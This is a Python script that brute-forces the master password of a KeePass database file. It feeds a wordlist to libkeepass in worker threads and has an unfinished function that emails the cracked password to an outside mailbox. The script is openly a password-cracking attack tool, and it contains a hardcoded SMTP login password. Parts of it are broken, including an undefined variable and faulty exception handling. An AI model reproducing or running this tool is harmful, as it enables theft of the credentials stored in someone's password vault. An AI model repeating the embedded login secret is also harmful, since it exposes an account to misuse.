#!/usr/bin/python
#-*- coding: utf-8 -*-
import libkeepass
import itertools as itr
import string
import smtplib
from email.mime.text import MIMEText
from email.header import Header
import threading
import Queue

words = string.digits
#my_custom = ['Hanyi','HanYi','Hanyi2016','HanYi2016']
my_customs = ['Hanyi']
password_file = "F:\My_Share\password.txt"
filename = "F:\My_Share\Hanyigroup.kdbx"
#filename = "/root/myfile/myfile/coolfire_person.kdbx"
wordqueue=Queue.Queue()

#生成密码
#def generate_password():
#	our_dict = itr.product(words,repeat=8)
#	for i in our_dict:
#		with open(password_file,"a") as f:
#				for j in my_customs:
#					f.write(j + "".join(i)+"\n")

class MyClass(threading.Thread):
    def __init__(self,q):
        threading.Thread.__init__(self)
        self.queue = q

    def run(self):
        while True:
            try:
                password = self.queue.get()
                #print "The thread %s is running" % self.getName()
                force_crack(password)
            except self.queue.Empty:
                break





#穷举
def force_crack(password):
	#for line in open(password_file):
	#	password = line.strip('\n')
		try:
			with libkeepass.open(filename,password=password) as kdb:
				print "Cracked,the password is %s" % password
				return password
		except KeyboardInterrupt:
				print "程序退出"
				exit()
		except:
	        		print password


for line in open(password_file):
    wordqueue.put(line.strip('\n'))


for i in range(2):
    t = MyClass(wordqueue)
    t.start()


#发送电子邮件
def send_mail():
    from_addr = 'services@kuaixiaodi.net'
    password = 'z2TABuO47lxNkgcyIFGw'
    smtp_server = 'smtp.exmail.qq.com'
    to_addr = 'taxuewuhenbb@126.com'
    message = u"您的密码已经成功破解,password:%s" % my_password
    msg = MIMEText(message,'plain','utf-8')
    #msg['From'] = Header("尔思科技 <%s>" % (from_addr,),'utf-8')
    msg['From'] = from_addr
    #msg['To'] = Header("devOps",'utf-8')
    msg['To'] = to_addr
    #邮件主题
    subject = '密码破解通知'
    msg['Subject'] = Header(subject,'utf-8')
    server = smtplib.SMTP_SSL(smtp_server,465)
    #设置调试级别
    server.set_debuglevel(1)
    server.login(from_addr,password)
    server.sendmail(from_addr,to_addr,msg.as_string())
    server.close()


#if __name__ == "__main__":
#	#generate_password()
#	#send_mail()
